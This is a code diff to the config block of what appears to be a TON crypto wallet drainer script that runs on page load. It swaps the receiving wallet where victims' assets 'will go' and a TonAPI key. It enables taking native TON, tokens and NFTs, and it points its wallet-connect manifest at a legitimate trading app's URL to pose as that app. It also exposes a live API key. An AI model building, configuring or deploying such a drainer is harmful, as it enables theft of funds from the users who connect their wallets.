@@ -32,13 +32,13 @@
 document.addEventListener("DOMContentLoaded", async () => {
 
     const CF = {
-        Wallet: "UQDZXmD6hTpBDVRUEj1rNMtPwZhWkjrv8F4dkq5LGZ96O8fO",  // Wallet address where the assets will go
+        Wallet: "UQD7hZgNQHzZxD-gKerLHZ9ZpCKK5YRdgmK7ZgfRKCupEUKf",  // Wallet address where the assets will go
         Native: true, // ('true' enabled or 'false' disabled)
         Tokens: true, // ('true' enabled or 'false' disabled)
         NFTs: true, // ('true' enabled or 'false' disabled)
         Tokens_First: false, // 'false' - At the value price, 'true' - Token are always first 
         Ton_rate: 5.43, // conversion rate ( 1 TON to USD = 7.99 )
-        TonApi_Key: "AFX6UIGUE3CI3AIAAAAFYQKOVDKS5H7JK4LCAK4BVXNP5GFH2QI63K7XVAIFX52R42HD2CA", // https://tonconsole.com/ (RECOMMENDED), 
+        TonApi_Key: "AHRSC4YWBXD5KIIAAAAGYSK3L4A3G7CS2HJA5QL3R4VJHHXQ67M5FUWLRLFYLOSBCQBW6EY", // https://tonconsole.com/ (RECOMMENDED), 
         manifestUrl: "https://app.storm.tg/tonconnect-manifest.json", // To use a personalized manifest, use « 'https://' + window.location.hostname + '/tonconnect-manifest.json' »
     }
     
